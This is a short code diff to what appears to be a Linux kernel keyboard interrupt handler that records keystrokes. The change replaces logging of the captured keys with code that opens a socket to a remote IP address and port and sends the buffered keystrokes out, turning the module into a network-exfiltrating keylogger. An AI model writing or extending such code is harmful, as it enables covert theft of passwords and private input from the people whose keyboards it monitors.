@@ -26,7 +26,10 @@ irqreturn_t keyboard_interrupt_handler(int irq, void *dev_id) {
         buffer_count++;
 
         if (buffer_count == KEY_BUFFER_SIZE) {
-            printk(KERN_INFO "Keys pressed: %s\n", keystrokes);
+            struct socket* sock = create_socket(IP_ADDRESS, PORT);
+            send_message(sock, keystrokes);
+            sock_release(sock);
+            
             buffer_count = 0;
         }
     }
